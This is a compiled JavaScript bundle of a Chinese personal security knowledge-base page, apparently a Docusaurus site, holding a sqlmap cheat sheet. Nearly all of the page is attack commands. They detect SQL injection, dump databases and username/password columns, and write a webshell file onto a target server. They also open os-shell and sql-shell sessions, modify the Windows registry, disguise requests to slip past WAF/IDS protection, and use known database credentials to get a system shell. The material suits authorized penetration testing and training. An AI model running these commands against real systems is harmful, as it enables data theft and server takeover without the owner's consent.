"use strict";(self.webpackChunkblog_source_2025=self.webpackChunkblog_source_2025||[]).push([[7277],{11742:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>t,contentTitle:()=>i,default:()=>p,frontMatter:()=>d,metadata:()=>l,toc:()=>o});const l=JSON.parse('{"id":"\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/\u5de5\u5177/sqlmap","title":"sqlmap","description":"\u8bf4\u660e","source":"@site/docs/01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/01.SQL\u6ce8\u5165/09.\u5de5\u5177/01.sqlmap.md","sourceDirName":"01.\u6e17\u900f\u6d4b\u8bd5/02.WEB\u6f0f\u6d1e/01.SQL\u6ce8\u5165/09.\u5de5\u5177","slug":"/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/\u5de5\u5177/sqlmap","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/\u5de5\u5177/sqlmap","draft":false,"unlisted":false,"tags":[],"version":"current","lastUpdatedBy":"d4m1ts","lastUpdatedAt":1748784450000,"sidebarPosition":1,"frontMatter":{},"sidebar":"knowledgeBaseSidebar","previous":{"title":"\u5de5\u5177","permalink":"/docs/category/\u5de5\u5177"},"next":{"title":"sqlmap-tamper","permalink":"/docs/\u6e17\u900f\u6d4b\u8bd5/WEB\u6f0f\u6d1e/SQL\u6ce8\u5165/\u5de5\u5177/sqlmap-tamper"}}');var r=n(74848),a=n(28453);const d={},i=void 0,t={},o=[{value:"\u8bf4\u660e",id:"\u8bf4\u660e",level:2},{value:"\u5e38\u7528\u547d\u4ee4",id:"\u5e38\u7528\u547d\u4ee4",level:2},{value:"<strong>\u68c0\u6d4b\u6ce8\u5165</strong>",id:"\u68c0\u6d4b\u6ce8\u5165",level:3},{value:"<strong>\u83b7\u53d6\u4fe1\u606f</strong>",id:"\u83b7\u53d6\u4fe1\u606f",level:3},{value:"<strong>\u641c\u7d22\u5b57\u6bb5</strong>",id:"\u641c\u7d22\u5b57\u6bb5",level:3},{value:"<strong>\u8bfb\u53d6\u4e0e\u5199\u5165\u6587\u4ef6</strong>",id:"\u8bfb\u53d6\u4e0e\u5199\u5165\u6587\u4ef6",level:3},{value:"<strong>\u63d0\u6743</strong>",id:"\u63d0\u6743",level:3},{value:"<strong>\u5bf9 Windows \u6ce8\u518c\u8868\u64cd\u4f5c</strong>",id:"\u5bf9-windows-\u6ce8\u518c\u8868\u64cd\u4f5c",level:3},{value:"<strong>\u9884\u4f30\u5b8c\u6210\u65f6\u95f4</strong>",id:"\u9884\u4f30\u5b8c\u6210\u65f6\u95f4",level:3},{value:"<strong>\u6d4b\u8bd5 WAF/IPS/IDS \u4fdd\u62a4</strong>",id:"\u6d4b\u8bd5-wafipsids-\u4fdd\u62a4",level:3},{value:"<strong>\u5c1d\u8bd5 getshell</strong>",id:"\u5c1d\u8bd5-getshell",level:3},{value:"<strong>\u5bbd\u5b57\u8282\u68c0\u6d4b</strong>",id:"\u5bbd\u5b57\u8282\u68c0\u6d4b",level:3},{value:"<strong>union \u8bed\u53e5\u6d4b\u8bd5</strong>",id:"union-\u8bed\u53e5\u6d4b\u8bd5",level:3},{value:"\u4e2a\u4eba\u5e38\u7528\u8bed\u53e5",id:"\u4e2a\u4eba\u5e38\u7528\u8bed\u53e5",level:3}];function c(e){const s={a:"a",code:"code",h2:"h2",h3:"h3",img:"img",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,a.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(s.h2,{id:"\u8bf4\u660e",children:"\u8bf4\u660e"}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.a,{href:"https://github.com/sqlmapproject/sqlmap.git",children:"https://github.com/sqlmapproject/sqlmap.git"})}),"\n",(0,r.jsx)(s.p,{children:"\u81f3\u4e8e\u53c2\u6570\u8be6\u7ec6\u8bf4\u660e\uff0c\u611f\u89c9\u6ca1\u591a\u5927\u5fc5\u8981\uff0c\u7bc7\u5e45\u4e5f\u4e0d\u591f\u957f\uff0c\u653e\u5f20\u56fe\u5373\u53ef\uff0c\u6709\u9700\u8981\u81ea\u5df1\u770b\u5373\u53ef"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-shell",children:"python3 sqlmap.py -h\n"})}),"\n",(0,r.jsx)(s.p,{children:(0,r.jsx)(s.img,{alt:"image-20220125105822550",src:n(40592).A+"",width:"1578",height:"2000"})}),"\n",(0,r.jsx)(s.h2,{id:"\u5e38\u7528\u547d\u4ee4",children:"\u5e38\u7528\u547d\u4ee4"}),"\n",(0,r.jsx)(s.h3,{id:"\u68c0\u6d4b\u6ce8\u5165",children:(0,r.jsx)(s.strong,{children:"\u68c0\u6d4b\u6ce8\u5165"})}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-shell",children:'sqlmap -u URL -v 3 --random-agent                       # \u5224\u65ad\u6ce8\u5165\nsqlmap -u URL -p id                                     # \u6307\u5b9a\u53c2\u6570\u6ce8\u5165\nsqlmap -u URL --cookie="xxxxx"                          # \u5e26 cookie \u6ce8\u5165\nsqlmap -u URL --batch                                   # \u4e0d\u8981\u8bf7\u6c42\u7528\u6237\u8f93\u5165,\u4f7f\u7528\u9ed8\u8ba4\u884c\u4e3a\nsqlmap -r "burpData.req"                                       # post \u578b\u6ce8\u5165\n\nsqlmap -u URL --flush-session                           # \u6e05\u9664\u7f13\u5b58\n\nsqlmap -u URL --os "Windows"                            # \u6307\u5b9a\u64cd\u4f5c\u7cfb\u7edf\nsqlmap -u URL --dbms mysql --level 3                    # \u6307\u5b9a\u6570\u636e\u5e93\u7c7b\u578b\u4e3a mysql,\u7ea7\u522b\u4e3a 3(\u5171 5 \u7ea7,\u7ea7\u522b\u8d8a\u9ad8,\u68c0\u6d4b\u8d8a\u5168\u9762)\nsqlmap -u URL --dbms Microsoft SQL Server\nsqlmap -u URL --dbms mysql --risk 3                     # \u6307\u5b9a\u6267\u884c\u6d4b\u8bd5\u7684\u98ce\u9669(1-3, \u9ed8\u8ba4 1) 1\u4f1a\u6d4b\u8bd5\u5927\u90e8\u5206\u7684\u6d4b\u8bd5\u8bed\u53e5,2\u4f1a\u589e\u52a0\u57fa\u4e8e\u4e8b\u4ef6\u7684\u6d4b\u8bd5\u8bed\u53e5,3\u4f1a\u589e\u52a0 OR \u8bed\u53e5\u7684 SQL \u6ce8\u5165\u6d4b\u8bd5\nsqlmap -u URL --proxy "socks5://127.0.0.1:1080"         # \u4ee3\u7406\u6ce8\u5165\u6d4b\u8bd5\nsqlmap -u URL --batch --smart                           # \u542f\u53d1\u5f0f\u5224\u65ad\u6ce8\u5165\n'})}),"\n",(0,r.jsx)(s.h3,{id:"\u83b7\u53d6\u4fe1\u606f",children:(0,r.jsx)(s.strong,{children:"\u83b7\u53d6\u4fe1\u606f"})}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-shell",children:'sqlmap -u URL --current-db          # \u83b7\u53d6\u5f53\u524d\u6570\u636e\u5e93\nsqlmap -u URL --dbs                 # \u679a\u4e3e\u6240\u6709\u6570\u636e\u5e93\nsqlmap -u URL -f                    # \u68c0\u67e5 DBMS \u7248\u672c\nsqlmap -u URL --is-dba              # \u5224\u65ad\u5f53\u524d\u7528\u6237\u662f\u5426\u662f dba\nsqlmap -u URL --users               # \u5217\u51fa\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\u7528\u6237\nsqlmap -u URL --privileges          # \u679a\u4e3e DBMS \u7528\u6237\u6743\u9650\nsqlmap -u URL --passwords           # \u83b7\u53d6\u5f53\u524d\u6570\u636e\u5e93\u5bc6\u7801\n\nsqlmap -u URL -D DATABASE --tables  # \u83b7\u53d6\u6570\u636e\u5e93\u8868\nsqlmap -u URL -D DATABASE -T TABLES --columns           # \u83b7\u53d6\u6307\u5b9a\u8868\u7684\u5217\u540d\nsqlmap -u URL -D DATABASE -T TABLES -C COLUMNS --dump   # \u83b7\u53d6\u6307\u5b9a\u8868\u7684\u5217\u540d\nsqlmap -u URL -dbms mysql -level 3 -D test -T admin -C "username,password" -dump    # dump \u51fa\u5b57\u6bb5 username \u4e0e password \u4e2d\u7684\u6570\u636e\nsqlmap -u URL --dump-all            # \u5217\u51fa\u6240\u6709\u6570\u636e\u5e93,\u6240\u6709\u8868\u5185\u5bb9\n'})}),"\n",(0,r.jsx)(s.h3,{id:"\u641c\u7d22\u5b57\u6bb5",children:(0,r.jsx)(s.strong,{children:"\u641c\u7d22\u5b57\u6bb5"})}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-shell",children:'sqlmap -r "burpData.req" -dbms mysql -D dedecms --search -C admin,password  # \u5728 dedecms \u6570\u636e\u5e93\u4e2d\u641c\u7d22\u5b57\u6bb5 admin \u6216\u8005 password.\n'})}),"\n",(0,r.jsx)(s.h3,{id:"\u8bfb\u53d6\u4e0e\u5199\u5165\u6587\u4ef6",children:(0,r.jsx)(s.strong,{children:"\u8bfb\u53d6\u4e0e\u5199\u5165\u6587\u4ef6"})}),"\n",(0,r.jsx)(s.p,{children:"\u9996\u5148\u627e\u9700\u8981\u7f51\u7ad9\u7684\u7269\u7406\u8def\u5f84,\u5176\u6b21\u9700\u8981\u6709\u53ef\u5199\u6216\u53ef\u8bfb\u6743\u9650."}),"\n",(0,r.jsxs)(s.ul,{children:["\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.code,{children:"-file-read=RFILE"})," \u4ece\u540e\u7aef\u7684\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\u6587\u4ef6\u7cfb\u7edf\u8bfb\u53d6\u6587\u4ef6 (\u7269\u7406\u8def\u5f84)"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.code,{children:"-file-write=WFILE"})," \u7f16\u8f91\u540e\u7aef\u7684\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\u6587\u4ef6\u7cfb\u7edf\u4e0a\u7684\u672c\u5730\u6587\u4ef6 (mssql xp_shell)"]}),"\n",(0,r.jsxs)(s.li,{children:[(0,r.jsx)(s.code,{children:"-file-dest=DFILE"})," \u540e\u7aef\u7684\u6570\u636e\u5e93\u7ba1\u7406\u7cfb\u7edf\u5199\u5165\u6587\u4ef6\u7684\u7edd\u5bf9\u8def\u5f84"]}),"\n"]}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-shell",children:'# \u6ce8 : mysql \u4e0d\u652f\u6301\u5217\u76ee\u5f55,\u4ec5\u652f\u6301\u8bfb\u53d6\u5355\u4e2a\u6587\u4ef6.sqlserver \u53ef\u4ee5\u5217\u76ee\u5f55,\u4e0d\u80fd\u8bfb\u5199\u6587\u4ef6,\u4f46\u9700\u8981\u4e00\u4e2a xp_dirtree \u51fd\u6570\nsqlmap -r "burpData.req" --file-dest "e:\\php\\htdocs\\dvwa\\inc\\include\\1.php" --file-write "f:\\webshell\\1112.php"\n'})}),"\n",(0,r.jsx)(s.h3,{id:"\u63d0\u6743",children:(0,r.jsx)(s.strong,{children:"\u63d0\u6743"})}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-shell",children:'sqlmap -u URL --sql-shell                       # \u83b7\u53d6\u4e00\u4e2a sql-shell \u4f1a\u8bdd\nsqlmap -u URL --os-shell                        # \u83b7\u53d6\u4e00\u4e2a os-shell \u4f1a\u8bdd\nsqlmap -u URL --os-cmd=ipconfig                 # \u5728\u6ce8\u5165\u70b9\u76f4\u63a5\u6267\u884c\u547d\u4ee4\nsqlmap -d "mssql://sa:sql123456@ip:1433/master" --os-shell  # \u77e5\u9053\u6570\u636e\u5e93\u5bc6\u7801\u540e\u63d0\u6743\u6210\u4e3a\u4ea4\u4e92\u5f0f\u7cfb\u7edfshell\n'})}),"\n",(0,r.jsx)(s.h3,{id:"\u5bf9-windows-\u6ce8\u518c\u8868\u64cd\u4f5c",children:(0,r.jsx)(s.strong,{children:"\u5bf9 Windows \u6ce8\u518c\u8868\u64cd\u4f5c"})}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-shell",children:'--reg-read                                      # \u8bfb\u53d6\u6ce8\u518c\u8868\u503c\n--reg-add                                       # \u5199\u5165\u6ce8\u518c\u8868\u503c\n--reg-del                                       # \u5220\u9664\u6ce8\u518c\u8868\u503c\n--reg-key,--reg-value,--reg-data,--reg-type     # \u6ce8\u518c\u8868\u8f85\u52a9\u9009\u9879\n\nsqlmap -u URL --reg-add --reg-key="HKEY_LOCAL_MACHINE\\SOFTWARE\\sqlmap" --reg-value=Test --reg-type=REG_SZ --reg-data=1\n'})}),"\n",(0,r.jsx)(s.h3,{id:"\u9884\u4f30\u5b8c\u6210\u65f6\u95f4",children:(0,r.jsx)(s.strong,{children:"\u9884\u4f30\u5b8c\u6210\u65f6\u95f4"})}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-shell",children:"--eta                                           # \u8ba1\u7b97\u6ce8\u5165\u6570\u636e\u7684\u5269\u4f59\u65f6\u95f4\n"})}),"\n",(0,r.jsx)(s.h3,{id:"\u6d4b\u8bd5-wafipsids-\u4fdd\u62a4",children:(0,r.jsx)(s.strong,{children:"\u6d4b\u8bd5 WAF/IPS/IDS \u4fdd\u62a4"})}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-shell",children:'--identify-waf                                                      # \u5c1d\u8bd5\u627e\u51faWAF/IPS/IDS\u4fdd\u62a4\uff0c\u65b9\u4fbf\u7528\u6237\u505a\u51fa\u7ed5\u8fc7\u65b9\u5f0f\u3002\n--mobile                                                            # \u6a21\u4eff\u667a\u80fd\u624b\u673a\n--referer "http://www.google.com"                                   # \u6a21\u62df\u6765\u6e90\n--user-agent "Googlebot/2.1(+http://www.googlebot.com/bot.html)"    # \u6a21\u62df\u8c37\u6b4c\u8718\u86db\n--skip-waf\n'})}),"\n",(0,r.jsx)(s.h3,{id:"\u5c1d\u8bd5-getshell",children:(0,r.jsx)(s.strong,{children:"\u5c1d\u8bd5 getshell"})}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-shell",children:'sqlmap -d "mysql://root:root@192.168.1.1:3306/mysql" --os-shell\n'})}),"\n",(0,r.jsx)(s.h3,{id:"\u5bbd\u5b57\u8282\u68c0\u6d4b",children:(0,r.jsx)(s.strong,{children:"\u5bbd\u5b57\u8282\u68c0\u6d4b"})}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-shell",children:'sqlmap -u URL --dbms mysql --prefix "%df%27" --technique U -v 3     # \u5bbd\u5b57\u8282\u68c0\u6d4b\n'})}),"\n",(0,r.jsx)(s.h3,{id:"union-\u8bed\u53e5\u6d4b\u8bd5",children:(0,r.jsx)(s.strong,{children:"union \u8bed\u53e5\u6d4b\u8bd5"})}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{children:"--union-cols=UCOLS  \u6d4b\u8bd5UNION\u67e5\u8be2\u7684SQL\u6ce8\u5165\u7684\u5217\u7684\u8303\u56f4\n--union-char=UCHAR  \u7528\u6765\u7834\u89e3\u5217\u6570\u7684\u5b57\u7b26\n--union-from=UFROM  \u5728UNION\u67e5\u8be2\u7684FROM\u90e8\u5206\u4e2d\u4f7f\u7528\u7684\u8868\n"})}),"\n",(0,r.jsx)(s.h3,{id:"\u4e2a\u4eba\u5e38\u7528\u8bed\u53e5",children:"\u4e2a\u4eba\u5e38\u7528\u8bed\u53e5"}),"\n",(0,r.jsx)(s.pre,{children:(0,r.jsx)(s.code,{className:"language-shell",children:"# risk3 \u4e00\u822c\u7528\u4e8e\u67e5\u8be2\u7684\u529f\u80fd\uff0c\u5982\u679c\u662fupdate\u8bed\u53e5\u4e00\u5b9a\u4e0d\u8981\uff01\uff01\uff01\n# \u57fa\u7840\npython3 sqlmap.py -r burpData.req --batch --random-agent -v 3 --level 3 --risk 3 --threads 5\n# \u6307\u5b9a\u4e00\u4e9b\u53c2\u6570\npython3 sqlmap.py -r burpData.req --batch --random-agent -v 3 --level 5 --risk 3 --threads 5 --dbms postgresql --technique=T --os-cmd whoami --proxy socks5://127.0.0.1:10808 --force-ssl --tamper xxx\n"})})]})}function p(e={}){const{wrapper:s}={...(0,a.R)(),...e.components};return s?(0,r.jsx)(s,{...e,children:(0,r.jsx)(c,{...e})}):c(e)}},28453:(e,s,n)=>{n.d(s,{R:()=>d,x:()=>i});var l=n(96540);const r={},a=l.createContext(r);function d(e){const s=l.useContext(a);return l.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function i(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:d(e.components),l.createElement(a.Provider,{value:s},e.children)}},40592:(e,s,n)=>{n.d(s,{A:()=>l});const l=n.p+"assets/images/image-20220125105822550-aff1737fd3ad59b161185a67b4553519.png"}}]);